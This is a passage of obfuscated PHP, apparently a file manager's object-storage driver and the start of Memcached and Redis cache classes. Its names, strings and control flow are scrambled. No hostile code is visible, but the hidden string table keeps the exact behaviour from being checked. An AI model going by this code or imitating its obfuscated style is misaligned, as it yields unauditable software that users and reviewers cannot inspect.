$this->setContent($FÂ†ŞÅ¦À, $Aìñå±ÉÖ); if ($bƒÒñ¤ !== !1) { return $this->getPathOuter($FÂ†ŞÅ¦À); } return !1; } public function mkdir($c¼ïˆºà¬, $Fœ•áÊàˆò = REPEAT_SKIP) { if (empty($c¼ïˆºà¬)) { return !1; } if ($this->_isFolder($c¼ïˆºà¬)) { return $this->getPathOuter($c¼ïˆºà¬); } $dŸõŞÕœÚš = $this->setContent($c¼ïˆºà¬, $_SERVER[£ü][33], !0); if ($dŸõŞÕœÚš !== !1) { return $this->getPathOuter($c¼ïˆºà¬); } return !1; } public function copyFile($Cçˆïç¬®Ä, $AÏğÏËÁ, $Cİ´õ™ªŠ¸ = array()) { $eÄİÀÂ–‘ =& $_SERVER[£ü]; $fÎ¶Ìí¿½ä = $this->objectMeta($Cçˆïç¬®Ä); if (!$fÎ¶Ìí¿½ä) { return !1; } if ($fÎ¶Ìí¿½ä[$eÄİÀÂ–‘[77]] <= 1024 * 1024 * 200) { $cÄ…ó•ß© = $this->client->copyObject($this->bucket, $Cçˆïç¬®Ä, $this->bucket, $AÏğÏËÁ, $eÄİÀÂ–‘[182], $Cİ´õ™ªŠ¸); } else { $cÄ…ó•ß© = $this->client->multiCopyObject($this->bucket, $Cçˆïç¬®Ä, $this->bucket, $AÏğÏËÁ, $Cİ´õ™ªŠ¸); } $cÄ…ó•ß© = $cÄ…ó•ß© ? $this->getPathOuter($AÏğÏËÁ) : !1; return $cÄ…ó•ß©; } public function moveFile($bòÒ­ƒˆ’†, $fóó›‡Æß½) { if ($this->copyFile($bòÒ­ƒˆ’†, $fóó›‡Æß½)) { $this->delFile($bòÒ­ƒˆ’†); return $this->getPathOuter($fóó›‡Æß½); } return !1; } public function delFile($D†•ßöİ¸¦) { return $this->client->deleteObject($this->bucket, $D†•ßöİ¸¦); } public function delFolder($dš·ÌùÍñİ) { goto Eø«ŒºÒÅÜ; e’œ¨Ñİ¡: return $CÛ¨„¤òê === $Aİ“Íõø¡½ ? !0 : !1; goto bèé¤›É¦; b„êİø¥‰‹: $CÛ¨„¤òê = $Aİ“Íõø¡½ = 0; $e»°šë× ™ = array_chunk(array_keys($E•êß¿²Á‚), 1000); foreach ($e»°šë× ™ as $d±¸§²ìíˆ) { $CÛ¨„¤òê++; $Aİ“Íõø¡½ += (int) $this->client->deleteObjects($this->bucket, $d±¸§²ìíˆ); } goto e’œ¨Ñİ¡; Eø«ŒºÒÅÜ: $eÔÚÅì½îƒ =& $_SERVER[£ü]; $E•êß¿²Á‚ = $this->listObjs($dš·ÌùÍñİ); if (!$E•êß¿²Á‚) { $dš·ÌùÍñİ = trim($dš·ÌùÍñİ, $eÔÚÅì½îƒ[8]); if (!empty($dš·ÌùÍñİ)) { $dš·ÌùÍñİ .= $eÔÚÅì½îƒ[8]; } return $this->delFile($dš·ÌùÍñİ); } goto b„êİø¥‰‹; bèé¤›É¦: } public function rename($b¯Œ”ªæ†«, $aË‚ë‰Ë´ò) { return $this->renameObject($b¯Œ”ªæ†«, $aË‚ë‰Ë´ò); } public function listPath($Aˆ„×®³£–, $E¢Îõ×µ¯Ì = false) { $B‰õËÇ†…ã =& $_SERVER[£ü]; $a‡«Úç¾êÎ = $this->listObjs($Aˆ„×®³£–, null, null, $B‰õËÇ†…ã[8]); $FªÅ¼°³¿ = array($B‰õËÇ†…ã[74] => array(), $B‰õËÇ†…ã[73] => array()); foreach ($a‡«Úç¾êÎ as $F‚÷ÜçæÇ => $BÜÕš‰Ò¶±) { if ($F‚÷ÜçæÇ == $B‰õËÇ†…ã[8]) { continue; } if (isset($BÜÕš‰Ò¶±[$B‰õËÇ†…ã[183]])) { $FªÅ¼°³¿[$B‰õËÇ†…ã[74]][] = $this->folderInfo($BÜÕš‰Ò¶±[$B‰õËÇ†…ã[183]], $E¢Îõ×µ¯Ì); } else { if (substr($BÜÕš‰Ò¶±[$B‰õËÇ†…ã[28]], -1) == $B‰õËÇ†…ã[8]) { continue; } $FªÅ¼°³¿[$B‰õËÇ†…ã[73]][] = $this->fileInfo($BÜÕš‰Ò¶±[$B‰õËÇ†…ã[28]], $E¢Îõ×µ¯Ì, $BÜÕš‰Ò¶±); } } return $FªÅ¼°³¿; } private function fileInfo($BÌÙíÂé¢, $FÒäåÁƒ¼® = false, $eäÍÖÂãÖŸ = array()) { goto DÙÁ˜ÖŠ±; cĞ÷ÀÈÀ: if (empty($eäÍÖÂãÖŸ)) { $eäÍÖÂãÖŸ = $this->objectMeta($BÌÙíÂé¢); if (!$eäÍÖÂãÖŸ) { return $E†²¾·İ‘º; } } if (isset($eäÍÖÂãÖŸ[$E×Î…¥ì™[187]])) { $E†²¾·İ‘º[$E×Î…¥ì™[107]] = $eäÍÖÂãÖŸ[$E×Î…¥ì™[187]]; } if (isset($eäÍÖÂãÖŸ[$E×Î…¥ì™[77]])) { $E†²¾·İ‘º[$E×Î…¥ì™[77]] = $eäÍÖÂãÖŸ[$E×Î…¥ì™[77]]; } goto b§ŠÉªóíÁ; DÙÁ˜ÖŠ±: $E×Î…¥ì™ =& $_SERVER[£ü]; if ($FÒäåÁƒ¼®) { return array($E×Î…¥ì™[28] => $this->pathThis($BÌÙíÂé¢), $E×Î…¥ì™[75] => $this->getPathOuter($BÌÙíÂé¢), $E×Î…¥ì™[29] => $E×Î…¥ì™[164], $E×Î…¥ì™[157] => $this->ext($BÌÙíÂé¢), $E×Î…¥ì™[77] => isset($eäÍÖÂãÖŸ[$E×Î…¥ì™[77]]) ? $eäÍÖÂãÖŸ[$E×Î…¥ì™[77]] : 0, $E×Î…¥ì™[184] => 0, $E×Î…¥ì™[107] => 0, $E×Î…¥ì™[185] => !0, $E×Î…¥ì™[186] => !0); } $E†²¾·İ‘º = array($E×Î…¥ì™[28] => $this->pathThis($BÌÙíÂé¢), $E×Î…¥ì™[75] => $this->getPathOuter($BÌÙíÂé¢), $E×Î…¥ì™[29] => $E×Î…¥ì™[164], $E×Î…¥ì™[184] => 0, $E×Î…¥ì™[107] => 0, $E×Î…¥ì™[77] => 0, $E×Î…¥ì™[157] => $this->ext($BÌÙíÂé¢), $E×Î…¥ì™[185] => !0, $E×Î…¥ì™[186] => !0); goto cĞ÷ÀÈÀ; b§ŠÉªóíÁ: return $E†²¾·İ‘º; goto e½ˆÉù¥¿‡; e½ˆÉù¥¿‡: } private function folderInfo($eÜƒ…¦‘¬æ, $fòìİÙœ…„ = false) { goto bÜ°®‡ˆí¾; bÜ°®‡ˆí¾: $f­ßİº§â =& $_SERVER[£ü]; if ($fòìİÙœ…„) { return array($f­ßİº§â[28] => $this->pathThis($eÜƒ…¦‘¬æ), $f­ßİº§â[75] => $this->getPathOuter($f­ßİº§â[8] . $eÜƒ…¦‘¬æ), $f­ßİº§â[29] => $f­ßİº§â[76], $f­ßİº§â[185] => !0, $f­ßİº§â[186] => !0); } $fÎÀ¹®…Ğ = array($f­ßİº§â[28] => $this->pathThis($eÜƒ…¦‘¬æ), $f­ßİº§â[75] => $this->getPathOuter($f­ßİº§â[8] . $eÜƒ…¦‘¬æ), $f­ßİº§â[29] => $f­ßİº§â[76], $f­ßİº§â[184] => 0, $f­ßİº§â[107] => 0, $f­ßİº§â[185] => !0, $f­ßİº§â[186] => !0); goto C­•Ğøëå°; C­•Ğøëå°: if ($eÜƒ…¦‘¬æ == $f­ßİº§â[33]) { return $fÎÀ¹®…Ğ; } $eÜƒ…¦‘¬æ = trim($eÜƒ…¦‘¬æ, $f­ßİº§â[8]) . $f­ßİº§â[8]; $BêŒ°ĞÖ¤Š = $this->objectMeta($eÜƒ…¦‘¬æ); goto CÈ‡ö¶‡ÛË; CÈ‡ö¶‡ÛË: if (isset($BêŒ°ĞÖ¤Š[$f­ßİº§â[187]])) { $fÎÀ¹®…Ğ[$f­ßİº§â[184]] = $BêŒ°ĞÖ¤Š[$f­ßİº§â[187]]; } return $fÎÀ¹®…Ğ; goto aô©Ä‰¢Õ; aô©Ä‰¢Õ: } public function listObjs($dÄÌ•ĞÑƒÏ, $b…´Í¥ê = null, $A»áÚ§¼·¢ = null, $a¹³­¿‰š‰ = null) { $cˆÜ‰„öÁ“ =& $_SERVER[£ü]; $dÄÌ•ĞÑƒÏ = trim($dÄÌ•ĞÑƒÏ, $cˆÜ‰„öÁ“[8]); $c¬êËŞîéÆ = empty($dÄÌ•ĞÑƒÏ) ? $cˆÜ‰„öÁ“[33] : $dÄÌ•ĞÑƒÏ . $cˆÜ‰„öÁ“[8]; return $this->client->getBucket($this->bucket, $c¬êËŞîéÆ, $b…´Í¥ê, $A»áÚ§¼·¢, $a¹³­¿‰š‰, !0); } public function has($A¥ÚÕË„Ø, $CÜÎº·ÈàÍ = false, $E„Í¢²îÃ– = true) { goto cô¾ˆ‡‚ù›; cô¾ˆ‡‚ù›: $CòÄ‚†Áİè =& $_SERVER[£ü]; $cö»µÔ¸ó’ = 0; $D¥Ò“ƒÕ” = 0; goto E»Åˆ®¢¶; AâŠÈ¶…¼Ÿ: if ($CÜÎº·ÈàÍ) { return array($CòÄ‚†Áİè[188] => $cö»µÔ¸ó’, $CòÄ‚†Áİè[189] => $D¥Ò“ƒÕ”); } return !1; goto B†·ãÚ¢Ø³; E»Åˆ®¢¶: $C¬‰–ñÏğµ = $this->listObjs($A¥ÚÕË„Ø, null, null, $CòÄ‚†Áİè[8]); $C¬‰–ñÏğµ = is_array($C¬‰–ñÏğµ) ? $C¬‰–ñÏğµ : array(); foreach ($C¬‰–ñÏğµ as $dë±åñÀ·Ú) { if (isset($dë±åñÀ·Ú[$CòÄ‚†Áİè[28]]) && substr($dë±åñÀ·Ú[$CòÄ‚†Áİè[28]], -1) != $CòÄ‚†Áİè[8]) { if (!$CÜÎº·ÈàÍ && $E„Í¢²îÃ–) { return !0; } $cö»µÔ¸ó’++; } else { if (isset($dë±åñÀ·Ú[$CòÄ‚†Áİè[183]])) { if (!$CÜÎº·ÈàÍ && !$E„Í¢²îÃ–) { return !1; } $D¥Ò“ƒÕ”++; } } } goto AâŠÈ¶…¼Ÿ; B†·ãÚ¢Ø³: } public function listAll($B•¹ê’ÎÌ‚) { $D¿ò³Ÿâ¨¸ =& $_SERVER[£ü]; $A¡óÙÌÌ¡½ = $this->listObjs($B•¹ê’ÎÌ‚); $CíÕ¯Ïßˆ¶ = $dÃã·š§ğ‹ = array(); foreach ($A¡óÙÌÌ¡½ as $EÊëçÈµù => $BÁìªÈÑ¶ä) { $CíÕ¯Ïßˆ¶[] = $BÁìªÈÑ¶ä[$D¿ò³Ÿâ¨¸[28]]; $dÃã·š§ğ‹[$EÊëçÈµù] = $BÁìªÈÑ¶ä[$D¿ò³Ÿâ¨¸[77]]; } return $this->listAllFiles($B•¹ê’ÎÌ‚, $CíÕ¯Ïßˆ¶, $dÃã·š§ğ‹); } public function canRead($eìË¨ó—£) { $eªªÚ–Ì¯ =& $_SERVER[£ü]; $F†ªß¶Î¬Æ = $this->client->getAccessControlPolicy($this->bucket, $eìË¨ó—£); if (!$F†ªß¶Î¬Æ) { return !1; } return in_array($F†ªß¶Î¬Æ, array($eªªÚ–Ì¯[190], $eªªÚ–Ì¯[191], $eªªÚ–Ì¯[192])) ? !0 : !1; } public function canWrite($d¨¢¬¬ˆš) { $eíÊğØÒ–š =& $_SERVER[£ü]; $c‘ƒ”íÔ‹ = $this->client->getAccessControlPolicy($this->bucket, $d¨¢¬¬ˆš); if (!$c‘ƒ”íÔ‹) { return !1; } return in_array($c‘ƒ”íÔ‹, array($eíÊğØÒ–š[190], $eíÊğØÒ–š[191])) ? !0 : !1; } public function getContent($fêëÎÙ¾°¸) { return $this->client->getObject($this->bucket, $fêëÎÙ¾°¸); } public function setContent($cçÆõîÖ¬Â, $BæÉ¶½Í¯» = '', $DÙ®£¡Úøà = false) { goto a¥¡¶¬â¢Ò; EÓ´›¬¶¿¥: $Dñ¶øº§¥œ = $this->copyFile($cçÆõîÖ¬Â, $cçÆõîÖ¬Â, array($Dƒ††Ê÷àÆ[193] => $Dñ¶øº§¥œ[$Dƒ††Ê÷àÆ[194]])); return $Dñ¶øº§¥œ ? !0 : !1; goto AÖŞñÅŒĞ¿; BÖÙø¬Ò¸‡: $Dñ¶øº§¥œ = $this->client->putObject($BæÉ¶½Í¯», $this->bucket, $cçÆõîÖ¬Â, $Dƒ††Ê÷àÆ[182], array(), $a†¡†ï–†õ); if (!$Dñ¶øº§¥œ) { return !1; } if ($DÙ®£¡Úøà) { return !0; } goto EÓ´›¬¶¿¥; a¥¡¶¬â¢Ò: $Dƒ††Ê÷àÆ =& $_SERVER[£ü]; $cçÆõîÖ¬Â = $DÙ®£¡Úøà ? trim($cçÆõîÖ¬Â, $Dƒ††Ê÷àÆ[8]) . $Dƒ††Ê÷àÆ[8] : $cçÆõîÖ¬Â; $a†¡†ï–†õ = get_file_mime(get_path_ext($cçÆõîÖ¬Â)); goto BÖÙø¬Ò¸‡; AÖŞñÅŒĞ¿: } public function fileSubstr($dƒùàÓƒ¢¥, $EÖÂ©éÎØÊ, $Aà»‚•Ğğ„) { $aË‚Ó½ì°÷ = $EÖÂ©éÎØÊ + $Aà»‚•Ğğ„ - 1; return $this->client->getObject($this->bucket, $dƒùàÓƒ¢¥, array($_SERVER[£ü][195] => "\142\x79\x74\x65\163\75{$EÖÂ©éÎØÊ}\x2d{$aË‚Ó½ì°÷}")); } public function upload($CÂÅßĞ•âÌ, $B…ÈÕ®¬Ã‚, $CØ—àƒæ¸‚ = false, $C‘’š´…ßÕ = REPEAT_REPLACE) { $A¦ğ¨Ü  =& $_SERVER[£ü]; $F×³÷¡»Ñ© = array($A¦ğ¨Ü [193] => @md5_file($B…ÈÕ®¬Ã‚)); $F¸è¥–»‘ = array($A¦ğ¨Ü [196] => get_file_mime(get_path_ext($CÂÅßĞ•âÌ))); if (IO::size($B…ÈÕ®¬Ã‚) <= 1024 * 1024 * 200) { $FÊ‘¸ĞĞä = $this->client->putObjectFile($B…ÈÕ®¬Ã‚, $this->bucket, $CÂÅßĞ•âÌ, $A¦ğ¨Ü [182], $F×³÷¡»Ñ©, $F¸è¥–»‘); return !empty($FÊ‘¸ĞĞä) ? $this->getPathOuter($CÂÅßĞ•âÌ) : !1; } $d¤İ˜÷Ùó = $this->client->multiUploadObject($B…ÈÕ®¬Ã‚, $this->bucket, trim($CÂÅßĞ•âÌ, $A¦ğ¨Ü [8]), $F×³÷¡»Ñ©, $F¸è¥–»‘); return $d¤İ˜÷Ùó ? $this->getPathOuter($CÂÅßĞ•âÌ) : !1; } public function download($cÅ÷çÇªì®, $FØ½õ…”–‡) { if (!@is_dir($this->pathFather($FØ½õ…”–‡)) && !IO::mkdir($this->pathFather($FØ½õ…”–‡))) { return !1; } $f¾¾‚Á˜Ü² = $this->client->getObject($this->bucket, $cÅ÷çÇªì®, array(), $FØ½õ…”–‡); return $f¾¾‚Á˜Ü² !== !1 ? $FØ½õ…”–‡ : !1; } public function link($E‡†íÙ£½í, $aŸàŞóÎ = array()) { $e‚À„²¶ =& $_SERVER[£ü]; if ($this->signVer == $e‚À„²¶[197]) { return $this->client->getAuthenticatedURL($this->bucket, $E‡†íÙ£½í, 3600 * 12, $aŸàŞóÎ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($E‡†íÙ£½í, $e‚À„²¶[8]), 3600 * 12, $this->region, array(), !0, $aŸàŞóÎ); } public function fileOut($dÓÏ¶Ô¸Ñİ, $d·®á¼ô = false, $aèªš¢´Ò = false, $E½ßÏ‡¯æÚ = '') { goto eÉ¹À²Ó¥; C——ä¿§ğ: $aÇ¿Ù±Ğ˜¡ = $this->link($dÓÏ¶Ô¸Ñİ, $F¨Ğ‚÷§); $this->fileOutLink($aÇ¿Ù±Ğ˜¡); goto e µ³ĞÈ; a°ˆÑÚËî: if ($DÛß×ïÄ == $bËù¤ÜººÌ[198]) { return parent::fileOut($dÓÏ¶Ô¸Ñİ, $d·®á¼ô, $aèªš¢´Ò, $E½ßÏ‡¯æÚ); } $d·®á¼ô = $d·®á¼ô ? $bËù¤ÜººÌ[199] : $bËù¤ÜººÌ[200]; $F¨Ğ‚÷§ = array($bËù¤ÜººÌ[201] => $d·®á¼ô . $bËù¤ÜººÌ[202] . rawurlencode($aèªš¢´Ò), $bËù¤ÜººÌ[203] => $DÛß×ïÄ); goto C——ä¿§ğ; eÉ¹À²Ó¥: $bËù¤ÜººÌ =& $_SERVER[£ü]; if (!$aèªš¢´Ò) { $aèªš¢´Ò = $this->pathThis($dÓÏ¶Ô¸Ñİ); } $DÛß×ïÄ = get_file_mime(get_path_ext($aèªš¢´Ò)); goto a°ˆÑÚËî; e µ³ĞÈ: } public function fileOutServer($bÇ›Ğ¸èô, $C•íÃó’†ç = false, $eøƒƒâË = false, $f¸¨·£Íò– = '') { parent::fileOut($bÇ›Ğ¸èô, $C•íÃó’†ç, $eøƒƒâË, $f¸¨·£Íò–); } public function fileOutImage($fœò‡´†•ç, $d›ñ¶È‘®¨ = 250) { $c¡äÖ÷ ’ = $this->link($fœò‡´†•ç); $this->fileOutLink($c¡äÖ÷ ’); } public function fileOutImageServer($cöÚ §ä, $E½ÙñÍ£ô = 250) { parent::fileOutImage($cöÚ §ä, $E½ÙñÍ£ô); } public function hashMd5($Dâ¹˜˜½¦Š, $fÆ‰ßÅ–ÈØ = '') { $a‚ÇÂ¸È±Š =& $_SERVER[£ü]; $c™È‚·Ù¿ = $this->objectMeta($Dâ¹˜˜½¦Š); if (!$c™È‚·Ù¿) { return !1; } $fÆ‰ßÅ–ÈØ = $fÆ‰ßÅ–ÈØ ? $fÆ‰ßÅ–ÈØ : _get($c™È‚·Ù¿, $a‚ÇÂ¸È±Š[204]); $fÆ‰ßÅ–ÈØ = $fÆ‰ßÅ–ÈØ ? $fÆ‰ßÅ–ÈØ : _get($c™È‚·Ù¿, $a‚ÇÂ¸È±Š[194], $a‚ÇÂ¸È±Š[33]); return $fÆ‰ßÅ–ÈØ; } public function uploadFormData($aî–ĞØ‡¼¼, $FÜ‚›ÇõñÆ = 3600) { $dˆÜ‹¼ÙÙ =& $_SERVER[£ü]; $A¡¹ÚØ™‡» = $this->pathFather($aî–ĞØ‡¼¼); $BÜøÍî÷Şä = $this->client->getHttpUploadPostParams($this->bucket, $A¡¹ÚØ™‡», $dˆÜ‹¼ÙÙ[182], $FÜ‚›ÇõñÆ); return array_merge((array) $BÜøÍî÷Şä, array($dˆÜ‹¼ÙÙ[166] => $this->getHost())); } public function multiUploadFormData($a‹ÛõáñÛß, $fŸß¼ïÚ¾â = 3600) { $Eè¾”ì¸‹¤ =& $_SERVER[£ü]; $DçŒ—ò¦ = gmdate($Eè¾”ì¸‹¤[205]); $EÉ‘¾²ƒˆ = array(); $DÎÇÎĞ¢Â = $this->client->getUploadId($this->bucket, $a‹ÛõáñÛß, $EÉ‘¾²ƒˆ); if (!$DÎÇÎĞ¢Â) { return !1; } return array($Eè¾”ì¸‹¤[206] => $DÎÇÎĞ¢Â, $Eè¾”ì¸‹¤[166] => $this->getHost() . $Eè¾”ì¸‹¤[8] . $this->pathEncode($a‹ÛõáñÛß), $Eè¾”ì¸‹¤[207] => $DçŒ—ò¦, $Eè¾”ì¸‹¤[89] => $a‹ÛõáñÛß); } public function multiUploadAuthData($eÙø­ËÍå˜, $cœ¼¤‡¾° = array()) { goto EÓä²‚Ã«; FİˆºŠ´‚ƒ: $bªŸé³†»¦ = implode($c½èÁª‡Œ[214], $Cˆ‚ªÇ³ §); $FÌÓãä = base64_encode(hash_hmac($c½èÁª‡Œ[215], $bªŸé³†»¦, $this->secret, !0)); $EÛõÁ¹Şœï = $c½èÁª‡Œ[216] . $this->accessKey . $c½èÁª‡Œ[4] . $FÌÓãä; goto FİãÙÙ…Ò›; aĞîÕÄ¶Â¨: $Bßñ‡‹½Æİ = $cœ¼¤‡¾°[$c½èÁª‡Œ[89]]; unset($cœ¼¤‡¾°[$c½èÁª‡Œ[89]]); if (isset($cœ¼¤‡¾°[$c½èÁª‡Œ[208]])) { $cœ¼¤‡¾°[$c½èÁª‡Œ[207]] = $eÃ†‰æÇ; return $this->listUploadParts($Bßñ‡‹½Æİ, $cœ¼¤‡¾°); } goto Dæã¥ç½ì—; EÓä²‚Ã«: $c½èÁª‡Œ =& $_SERVER[£ü]; $eÃ†‰æÇ = isset($cœ¼¤‡¾°[$c½èÁª‡Œ[207]]) ? $cœ¼¤‡¾°[$c½èÁª‡Œ[207]] : gmdate($c½èÁª‡Œ[205]); $C»ø×Ñ„í¹ = isset($cœ¼¤‡¾°[$c½èÁª‡Œ[157]]) ? $cœ¼¤‡¾°[$c½èÁª‡Œ[157]] : $c½èÁª‡Œ[33]; goto aĞîÕÄ¶Â¨; FİãÙÙ…Ò›: if (strpos($C»ø×Ñ„í¹, $c½èÁª‡Œ[210]) === 0) { return array($c½èÁª‡Œ[217] => $EÛõÁ¹Şœï, $c½èÁª‡Œ[207] => $eÃ†‰æÇ); } return $EÛõÁ¹Şœï; goto eÏÛ¸Ñˆ¹Ş; Dæã¥ç½ì—: $Cˆ‚ªÇ³ § = array($c½èÁª‡Œ[209], $c½èÁª‡Œ[33], $c½èÁª‡Œ[116], $c½èÁª‡Œ[33], "\170\x2d\141\x6d\x7a\55\144\141\164\x65\x3a{$eÃ†‰æÇ}", $c½èÁª‡Œ[8] . $this->bucket . $c½èÁª‡Œ[8] . $this->pathEncode($Bßñ‡‹½Æİ) . $C»ø×Ñ„í¹); if (strpos($C»ø×Ñ„í¹, $c½èÁª‡Œ[210]) === 0) { $Cˆ‚ªÇ³ §[0] = $c½èÁª‡Œ[211]; } if (isset($cœ¼¤‡¾°[$c½èÁª‡Œ[212]]) && $cœ¼¤‡¾°[$c½èÁª‡Œ[212]] == $c½èÁª‡Œ[213]) { $Cˆ‚ªÇ³ §[0] = $c½èÁª‡Œ[213]; } goto FİˆºŠ´‚ƒ; eÏÛ¸Ñˆ¹Ş: } public function listUploadParts($eç¸‘ÔÙ×Ç, $B‚»—ôÓ‹„ = array()) { goto b’ˆ•Ô°ïÊ; D±”—¬Ñ¹: $Fê—±ğ¦° = $this->multiUploadAuthData($eç¸‘ÔÙ×Ç, $B‚»—ôÓ‹„); if (empty($Fê—±ğ¦°)) { return !1; } return array($B‹£­ÃíŒÉ[217] => $Fê—±ğ¦°, $B‹£­ÃíŒÉ[207] => $B‚»—ôÓ‹„[$B‹£­ÃíŒÉ[207]], $B‹£­ÃíŒÉ[219] => $F¤ù¸‚ØÈ); goto d›ÃÁÓõ³; cÖ„òè½: if (!$F¤ù¸‚ØÈ) { return !1; } unset($B‚»—ôÓ‹„[$B‹£­ÃíŒÉ[208]], $B‚»—ôÓ‹„[$B‹£­ÃíŒÉ[212]]); $B‚»—ôÓ‹„[$B‹£­ÃíŒÉ[89]] = $eç¸‘ÔÙ×Ç; goto D±”—¬Ñ¹; b’ˆ•Ô°ïÊ: $B‹£­ÃíŒÉ =& $_SERVER[£ü]; $a—©µÚÃäñ = str_replace($B‹£­ÃíŒÉ[218], $B‹£­ÃíŒÉ[33], $B‚»—ôÓ‹„[$B‹£­ÃíŒÉ[157]]); $F¤ù¸‚ØÈ = $this->client->listParts($this->bucket, $eç¸‘ÔÙ×Ç, $a—©µÚÃäñ); goto cÖ„òè½; d›ÃÁÓõ³: } public function getHost() { return parent::getHost() . $_SERVER[£ü][8] . $this->bucket; } public function size($A´î˜µù»Ø) { $añº®Š¹‘ò = $this->objectMeta($A´î˜µù»Ø); return $añº®Š¹‘ò ? $añº®Š¹‘ò[$_SERVER[£ü][77]] : 0; } public function info($bæŸíÉ†×ì) { if ($this->isFolder($bæŸíÉ†×ì)) { return $this->folderInfo($bæŸíÉ†×ì); } else { if ($this->isFile($bæŸíÉ†×ì)) { return $this->fileInfo($bæŸíÉ†×ì); } } return !1; } public function exist($D´¿¥æ¦) { return $this->isFile($D´¿¥æ¦) || $this->isFolder($D´¿¥æ¦); } public function isFile($bŸ„¥†˜”°) { return !$this->isFolder($bŸ„¥†˜”°) && $this->objectMeta($bŸ„¥†˜”°); } public function isFolder($CôÒ°“òåô) { return $this->cacheMethod($_SERVER[£ü][220], $CôÒ°“òåô); } protected function objectMeta($FÌÕŠÛ„ï) { return $this->cacheMethod($_SERVER[£ü][221], $FÌÕŠÛ„ï); } protected function _objectMeta($aÀŸÓÌÍ©ç) { $e‘ïå´¦İ =& $_SERVER[£ü]; $aÀŸÓÌÍ©ç = rtrim($aÀŸÓÌÍ©ç, $e‘ïå´¦İ[8]); try { $bÉíƒ„—³¾ = $this->client->getObjectInfo($this->bucket, $aÀŸÓÌÍ©ç); if (!isset($bÉíƒ„—³¾[$e‘ïå´¦İ[204]]) && isset($bÉíƒ„—³¾[$e‘ïå´¦İ[222]])) { $bÉíƒ„—³¾[$e‘ïå´¦İ[204]] = $bÉíƒ„—³¾[$e‘ïå´¦İ[222]]; } } catch (OSS\Core\OssException $DËß¹¹³Öñ) { $bÉíƒ„—³¾ = !1; } if (!$bÉíƒ„—³¾) { } return $bÉíƒ„—³¾; } protected function _isFolder($bÓœèä¼´‰) { goto eõ‘ŒÈ¬¿˜; bõ›éĞóÒ: $f—„šóâ“ = $this->client->getBucket($this->bucket, $bÓœèä¼´‰, null, 1); if (empty($f—„šóâ“)) { return !1; } $f—„šóâ“ = array_values($f—„šóâ“); goto c×Øó‚‚³; c×Øó‚‚³: if (substr($f—„šóâ“[0][$fãÇ¨çº [28]], -1) == $fãÇ¨çº [8]) { return !0; } if (get_path_this($f—„šóâ“[0][$fãÇ¨çº [28]]) == get_path_this($bÓœèä¼´‰)) { return !1; } return !0; goto e²‡ôŒñ÷ï; eõ‘ŒÈ¬¿˜: $fãÇ¨çº  =& $_SERVER[£ü]; $bÓœèä¼´‰ = rtrim($bÓœèä¼´‰, $fãÇ¨çº [8]); if ($bÓœèä¼´‰ == $fãÇ¨çº [33] || $bÓœèä¼´‰ == $fãÇ¨çº [8]) { return !0; } goto bõ›éĞóÒ; e²‡ôŒñ÷ï: } } define($_SERVER[£ü][223], 1); goto D´˜‘İ°šË; BŒ®öÊİí¼: define($_SERVER[£ü][1896], 5); define($_SERVER[£ü][1897], 16); define($_SERVER[£ü][1898], 32); goto EƒàòÀæ; C¥¤õ†ƒ¾é: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Bòã‘Ğ£äâ, $cäšêšõç×) { $bšç·§…†• =& $_SERVER[£ü]; if (!class_exists($bšç·§…†•[772])) { show_json($bšç·§…†•[773], !1); } $this->cacheTime = $cäšêšõç×; $this->handle = new Memcached(); if (is_array($Bòã‘Ğ£äâ[$bšç·§…†•[774]]) && count($Bòã‘Ğ£äâ[$bšç·§…†•[774]]) >= 1) { foreach ($Bòã‘Ğ£äâ[$bšç·§…†•[774]] as $c†Û¡¨·„Ä) { $Eøæ¾Õ¢¯ò = explode($bšç·§…†•[4], $c†Û¡¨·„Ä); $this->handle->addServer($Eøæ¾Õ¢¯ò[0], $Eøæ¾Õ¢¯ò[1]); } } else { $this->handle->addServer($Bòã‘Ğ£äâ[$bšç·§…†•[166]], $Bòã‘Ğ£äâ[$bšç·§…†•[167]]); } } public function set($A„ÄĞ«ÎÈ, $eÑÂàŒàÄé, $a „Ñ±ÇÎ¯ = false) { $a „Ñ±ÇÎ¯ = $a „Ñ±ÇÎ¯ ? $a „Ñ±ÇÎ¯ : $this->cacheTime; return $this->handle->set($A„ÄĞ«ÎÈ, $eÑÂàŒàÄé, $a „Ñ±ÇÎ¯); } public function get($bƒ­ÁºÄ¿) { return $this->handle->get($bƒ­ÁºÄ¿); } public function remove($B…±¢Ø¸àø) { return $this->handle->delete($B…±¢Ø¸àø); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($FÖÊ„éé¤¥, $a‘­êÄ²öš) { $a„óóŒ®Š‹ =& $_SERVER[£ü]; if (!class_exists($a„óóŒ®Š‹[775])) { show_json($a„óóŒ®Š‹[776], !1); } $this->cacheTime = $a‘­êÄ²öš; $eë®¥»ˆÕ‹ = isset($FÖÊ„éé¤¥[$a„óóŒ®Š‹[777]]) ? $FÖÊ„éé¤¥[$a„óóŒ®Š‹[777]] : 10; $bŒ¹½ËÒ¨æ = _get($FÖÊ„éé¤¥, $a„óóŒ®Š‹[774]); if ($bŒ¹½ËÒ¨æ && is_array($bŒ¹½ËÒ¨æ)) { $this->isCluster = !0; $this->initCluster($FÖÊ„éé¤¥, $eë®¥»ˆÕ‹); } else { $this->handle = $this->init($FÖÊ„éé¤¥, $eë®¥»ˆÕ‹); } } private function init($Fô¾¹‚’Õ, $C®¼…Ó‰ˆ) { $BÛ÷–ùŞá• =& $_SERVER[£ü]; $AÕ¶™““Ü = new Redis(); $A›Ïö‚°Î¨ = isset($Fô¾¹‚’Õ[$BÛ÷–ùŞá•[778]]) ? $Fô¾¹‚’Õ[$BÛ÷–ùŞá•[778]] : !1; if ($A›Ïö‚°Î¨) { $AÕ¶™““Ü->pconnect($Fô¾¹‚’Õ[$BÛ÷–ùŞá•[166]], $Fô¾¹‚’Õ[$BÛ÷–ùŞá•[167]], $C®¼…Ó‰ˆ); } else { $AÕ¶™““Ü->connect($Fô¾¹‚’Õ[$BÛ÷–ùŞá•[166]], $Fô¾¹‚’Õ[$BÛ÷–ùŞá•[167]], $C®¼…Ó‰ˆ); } if (!empty($Fô¾¹‚’Õ[$BÛ÷–ùŞá•[373]])) { $AÕ¶™““Ü->auth($Fô¾¹‚’Õ[$BÛ÷–ùŞá•[373]]); } return $AÕ¶™““Ü; } private function initCluster($C«ÕÜ±¹Ëù, $B éª‹“ë) { $d‚ÛÍÄ³Ù =& $_SERVER[£ü]; $cåÌ‹¦öä‹ = 